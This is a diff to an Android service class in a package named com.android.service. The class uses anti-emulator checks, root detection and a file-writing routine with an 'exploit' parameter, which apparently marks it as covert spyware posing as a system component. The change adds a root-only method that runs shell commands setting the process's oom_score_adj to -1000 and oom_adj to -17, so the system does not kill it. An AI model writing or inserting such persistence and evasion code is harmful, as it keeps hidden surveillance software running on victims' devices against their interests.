@@ -44,6 +44,7 @@ import com.android.service.capabilities.PackageInfo;
 import com.android.service.crypto.Keys;
 import com.android.service.util.AntiEmulator;
 import com.android.service.util.Check;
+import com.android.service.util.Execute;
 import com.android.service.util.Utils;
 
 /**
@@ -138,6 +139,8 @@ public class ServiceCore extends Service {
 
 			Status.self().setRoot(PackageInfo.checkRoot());
 
+			adjustOom();
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart): isRoot = " + Status.self().haveRoot()); //$NON-NLS-1$
 			}
@@ -608,6 +611,26 @@ public class ServiceCore extends Service {
 		}
 	}
 
+	private void adjustOom() {	
+		if (Status.self().haveRoot() == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
+			}
+			
+			return;
+		}
+		
+		Execute ex = new Execute();
+		String packageName = PackageInfo.getPackageName();
+		
+		ex.execute("echo '-1000' > /proc/`pidof " + packageName + "`/oom_score_adj");
+		ex.execute("echo '-17' > /proc/" + packageName + "/oom_adj");
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (enclosing_method): OOM Adjusted"); //$NON-NLS-1$
+		}
+	}
+	
 	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
 			FileNotFoundException {
 		try {
